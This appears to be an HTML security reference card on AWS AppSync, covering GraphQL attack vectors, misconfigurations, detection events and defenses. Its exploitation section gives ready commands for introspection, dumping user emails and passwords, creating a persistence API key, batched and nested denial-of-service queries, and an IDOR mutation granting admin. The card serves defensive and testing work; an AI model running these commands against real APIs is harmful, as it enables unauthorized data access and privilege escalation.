@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS AppSync Security | AWS Security Cards</title>
+<meta name="description" content="AWS AppSync is a managed GraphQL service that connects applications to data sources including DynamoDB, Lambda, HTTP endpoints, and RDS. It provides real-time subscriptions and offline sync. Attackers exploit GraphQL introspection, authorization flaws, and resolver misconfigurations.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #06b6d415, #0a0e1a, #0ea5e915);
+    border: 1px solid #06b6d44d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #06b6d40d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #06b6d433;
+    color: #06b6d4;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #06b6d44d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #f87171; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/appsync-card.webp" alt="AWS AppSync Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/appsync.svg" alt="AWS AppSync Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS AppSync Security</span>
+        <span class="header-badge">MANAGED GRAPHQL</span>
+      </div>
+      <p class="header-desc">AWS AppSync is a managed GraphQL service that connects applications to data sources including DynamoDB, Lambda, HTTP endpoints, and RDS. It provides real-time subscriptions and offline sync. Attackers exploit GraphQL introspection, authorization flaws, and resolver misconfigurations.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">HIGH</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">GraphQL</div>
+          <div class="stat-label">Query Language</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">5 Auth</div>
+          <div class="stat-label">Methods</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">Real-time</div>
+          <div class="stat-label">Subscriptions</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#06b6d4;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #06b6d4;">GraphQL API Architecture</h4>
+          <p>AppSync APIs define a GraphQL schema with types, queries, mutations, and subscriptions. Resolvers connect schema fields to data sources. VTL (Velocity Template Language) or JavaScript resolvers transform requests and responses.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Introspection reveals the complete API schema - all types, fields, and operations available</div>
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">Authentication Methods</h4>
+          <p>AppSync supports API Key, Cognito User Pools, OIDC, IAM, and Lambda authorizers. Multiple auth types can be enabled simultaneously. Field-level authorization controls access to specific schema elements.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> API keys in client code or misconfigured Cognito pools allow unauthorized API access</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 80%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">8.0</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">AppSync APIs often expose sensitive business data through GraphQL. Introspection reveals the complete API surface, resolver misconfigurations enable data access bypass, and compromised API keys or auth tokens provide full query capabilities.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">GraphQL Exploitation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Introspection query to discover schema</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Batch queries for denial of service</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Deeply nested queries for resource exhaustion</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Query injection via variable manipulation</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Subscription hijacking for data streaming</li></ul><h4 style="color: #f87171;">Authorization Bypass</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access fields without proper auth directives</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Exploit missing resolver authorization</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Bypass Cognito group restrictions</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Use expired or stolen API keys</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> IDOR via predictable ID fields</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Schema &amp; Resolver Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Introspection enabled in production</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing @auth directives on sensitive fields</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Resolver returns all DynamoDB attributes</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No query depth/complexity limits</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Lambda resolver with excessive permissions</li></ul><h4 style="color: #fb923c;">Authentication Problems</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> API key exposed in frontend code</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Long API key expiration (365 days)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Cognito pool allows self-registration</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing field-level authorization</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> IAM auth with overprivileged roles</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List GraphQL APIs</div>
+          <pre><code>aws appsync list-graphql-apis</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get API Details</div>
+          <pre><code>aws appsync get-graphql-api \\
+  --api-id abc123def456</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List API Keys</div>
+          <pre><code>aws appsync list-api-keys \\
+  --api-id abc123def456</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Schema (Introspection)</div>
+          <pre><code>aws appsync get-introspection-schema \\
+  --api-id abc123def456 \\
+  --format SDL \\
+  schema.graphql</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Data Sources</div>
+          <pre><code>aws appsync list-data-sources \\
+  --api-id abc123def456</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔎 Introspection Attacks</h3><h4 style="color: #22d3ee;">Schema Discovery</h4><ul><li><span class="bullet" style="color: #22d3ee;">&#x2022;</span> Query __schema to get all types</li><li><span class="bullet" style="color: #22d3ee;">&#x2022;</span> Enumerate queries, mutations, subscriptions</li><li><span class="bullet" style="color: #22d3ee;">&#x2022;</span> Discover hidden admin operations</li><li><span class="bullet" style="color: #22d3ee;">&#x2022;</span> Find sensitive field names (password, ssn)</li><li><span class="bullet" style="color: #22d3ee;">&#x2022;</span> Map relationships between types</li></ul><h4 style="color: #22d3ee;">Reconnaissance Value</h4><ul><li><span class="bullet" style="color: #22d3ee;">&#x2022;</span> Complete API documentation exposure</li><li><span class="bullet" style="color: #22d3ee;">&#x2022;</span> Identify data model and business logic</li><li><span class="bullet" style="color: #22d3ee;">&#x2022;</span> Find deprecated but still active fields</li><li><span class="bullet" style="color: #22d3ee;">&#x2022;</span> Discover internal-only operations</li><li><span class="bullet" style="color: #22d3ee;">&#x2022;</span> Map authorization requirements</li></ul><div class="note"><strong>First Step:</strong> Always run introspection query first - it reveals the complete attack surface.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">⚡ Resolver Exploitation</h3><h4 style="color: #facc15;">VTL Injection</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Inject into $context.arguments</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Manipulate DynamoDB scan filters</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Bypass authorization in resolver logic</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Access $context.identity for impersonation</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Exploit string concatenation in templates</li></ul><h4 style="color: #facc15;">Data Source Abuse</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> DynamoDB scan returning all items</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Lambda resolver with excessive IAM</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> HTTP resolver to internal endpoints</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> RDS resolver with SQL injection</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> OpenSearch resolver query manipulation</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> GetIntrospectionSchema - schema download</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateApiKey - new API key created</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateGraphqlApi - API configuration changed</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateResolver - resolver modified</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateDataSource - new data source added</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Introspection queries in CloudWatch logs</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> High volume of failed auth attempts</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Deeply nested or batched queries</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> API key usage from unusual IPs</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unauthorized field access in resolvers</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Introspection Query</div>
+          <pre><code>curl -X POST \\
+  -H &quot;x-api-key: da2-xxxxxxxxxxxx&quot; \\
+  -H &quot;Content-Type: application/json&quot; \\
+  -d '{&quot;query&quot;:&quot;query { __schema { types { name fields { name } } } }&quot;}' \\
+  https://xxxxxx.appsync-api.us-east-1.amazonaws.com/graphql</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get All Data (No Pagination)</div>
+          <pre><code>curl -X POST \\
+  -H &quot;x-api-key: da2-xxxx&quot; \\
+  -d '{&quot;query&quot;:&quot;query { listUsers { items { id email password } } }&quot;}' \\
+  https://xxx.appsync-api.us-east-1.amazonaws.com/graphql</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Create API Key (Persistence)</div>
+          <pre><code>aws appsync create-api-key \\
+  --api-id abc123 \\
+  --description &quot;backup-key&quot; \\
+  --expires $(date -d &quot;+365 days&quot; +%s)</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Download Full Schema</div>
+          <pre><code>aws appsync get-introspection-schema \\
+  --api-id abc123 \\
+  --format SDL \\
+  schema.graphql</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Resolvers</div>
+          <pre><code>aws appsync list-resolvers \\
+  --api-id abc123 \\
+  --type-name Query</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Resolver Code (VTL)</div>
+          <pre><code>aws appsync get-resolver \\
+  --api-id abc123 \\
+  --type-name Query \\
+  --field-name getUser</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Full Introspection Query</div>
+          <pre><code>query IntrospectionQuery {
+  __schema {
+    queryType { name }
+    mutationType { name }
+    subscriptionType { name }
+    types {
+      name
+      fields {
+        name
+        args { name type { name } }
+        type { name }
+      }
+    }
+  }
+}</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Batched Query DoS</div>
+          <pre><code>query {
+  user1: getUser(id: &quot;1&quot;) { name email }
+  user2: getUser(id: &quot;2&quot;) { name email }
+  user3: getUser(id: &quot;3&quot;) { name email }
+  # ... repeat 100+ times
+}</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Deeply Nested Query</div>
+          <pre><code>query {
+  user(id: &quot;1&quot;) {
+    posts {
+      comments {
+        author {
+          posts {
+            comments {
+              author { name }
+            }
+          }
+        }
+      }
+    }
+  }
+}</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">IDOR Exploitation</div>
+          <pre><code>mutation {
+  updateUser(id: &quot;other-user-id&quot;, input: {
+    role: &quot;admin&quot;
+  }) {
+    id
+    role
+  }
+}</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - No Auth Directive</span>
+          </div>
+          <pre><code>type Query {
+  getUser(id: ID!): User
+  listUsers: [User]
+  getSecrets: [Secret]
+}</code></pre>
+          <p class="policy-desc">No @auth directives - anyone with API access can query all data</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Auth Directives</span>
+          </div>
+          <pre><code>type Query {
+  getUser(id: ID!): User @auth(rules: [{allow: owner}])
+  listUsers: [User] @auth(rules: [{allow: groups, groups: [&quot;Admin&quot;]}])
+}
+
+type Secret @auth(rules: [{allow: private}]) {
+  id: ID!
+  value: String!
+}</code></pre>
+          <p class="policy-desc">Field and type-level authorization restricts access</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Overprivileged Resolver Role</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;dynamodb:*&quot;,
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Resolver IAM role can access any DynamoDB table</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Scoped Resolver Role</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [&quot;dynamodb:GetItem&quot;, &quot;dynamodb:Query&quot;],
+    &quot;Resource&quot;: &quot;arn:aws:dynamodb:us-east-1:*:table/Users&quot;,
+    &quot;Condition&quot;: {
+      &quot;ForAllValues:StringEquals&quot;: {
+        &quot;dynamodb:LeadingKeys&quot;: [&quot;\${appsync:sub}&quot;]
+      }
+    }
+  }]
+}</code></pre>
+          <p class="policy-desc">Resolver can only access current user's items</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Disable Introspection in Production</h4>
+              <p>Turn off introspection queries to prevent schema discovery.</p>
+              <pre><code>aws appsync update-graphql-api \\
+  --api-id abc123 \\
+  --introspection-config DISABLED</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Implement Field-Level Authorization</h4>
+              <p>Add @auth directives to all sensitive types and fields in schema.</p>
+              <pre><code>type Secret @auth(rules: [
+  {allow: groups, groups: [&quot;Admin&quot;]}
+]) { ... }</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">⏱️</span>
+            <div>
+              <h4>Rotate API Keys Frequently</h4>
+              <p>Set short expiration (7 days) and rotate API keys regularly.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Use Cognito or IAM Over API Keys</h4>
+              <p>Prefer user-based auth (Cognito) or IAM for production APIs.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📊</span>
+            <div>
+              <h4>Implement Query Depth Limits</h4>
+              <p>Use AWS WAF or custom Lambda authorizer to limit query complexity.</p>
+              <pre><code># WAF rule for query depth
+# Block if nested levels &gt; 5</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📝</span>
+            <div>
+              <h4>Enable CloudWatch Logging</h4>
+              <p>Log all GraphQL operations including field-level resolver execution.</p>
+              <pre><code>--log-config fieldLogLevel=ALL,
+excludeVerboseContent=false</code></pre>
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS AppSync Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
